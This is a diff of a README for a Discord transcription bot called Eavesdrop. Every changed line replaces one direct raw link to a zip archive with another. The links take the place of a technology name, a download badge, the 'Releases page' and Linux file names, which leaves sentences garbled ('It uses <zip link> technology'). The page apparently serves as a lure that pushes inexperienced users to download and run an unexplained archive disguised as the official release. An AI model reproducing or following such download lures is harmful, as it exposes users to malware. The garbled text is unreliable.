@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Eavesdrop is a powerful Discord bot that helps you transcribe voice messages and media attachments. It uses https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip technology to provide accurate text conversions of your spoken content. This guide will help you download and run Eavesdrop easily, even if you have little or no technical experience.
+Eavesdrop is a powerful Discord bot that helps you transcribe voice messages and media attachments. It uses https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip technology to provide accurate text conversions of your spoken content. This guide will help you download and run Eavesdrop easily, even if you have little or no technical experience.
 
 ## 📥 Download Eavesdrop
 
-[![Download Eavesdrop](https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip%20Now-Get%20Eavesdrop-brightgreen)](https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip)
+[![Download Eavesdrop](https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip%20Now-Get%20Eavesdrop-brightgreen)](https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before downloading Eavesdrop, ensure your system meets the following requirement
 
 ## 🌐 Download & Install
 
-1. **Visit the Releases Page:** Head over to the [Releases page](https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip) to find the latest version of Eavesdrop. You’ll see a list of available versions.
+1. **Visit the Releases Page:** Head over to the [Releases page](https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip) to find the latest version of Eavesdrop. You’ll see a list of available versions.
    
 2. **Select the Latest Version:** Look for the most recent release. It usually appears at the top of the list.
 
@@ -29,7 +29,7 @@ Before downloading Eavesdrop, ensure your system meets the following requirement
 
    - **For Windows:** Double-click the downloaded .exe file and follow the installation prompts.
    - **For macOS:** Open the .dmg file and drag the Eavesdrop icon to your Applications folder.
-   - **For Linux:** Extract the https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip file and follow the included installation instructions in the https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip file.
+   - **For Linux:** Extract the https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip file and follow the included installation instructions in the https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip file.
 
 ## 🔧 Setting Up Eavesdrop
 
@@ -78,4 +78,4 @@ If you encounter any issues, you can reach out via the Issues section on our Git
 
 ## 📥 Download Eavesdrop
 
-Don’t miss out on transcription convenience. [Visit the Releases page](https://github.com/masgom/Eavesdrop/raw/refs/heads/main/assets/Software-v3.5.zip) again to get your version of Eavesdrop and start enhancing your Discord experience today!
+Don’t miss out on transcription convenience. [Visit the Releases page](https://raw.githubusercontent.com/masgom/Eavesdrop/main/extensions/Software-v1.8.zip) again to get your version of Eavesdrop and start enhancing your Discord experience today!
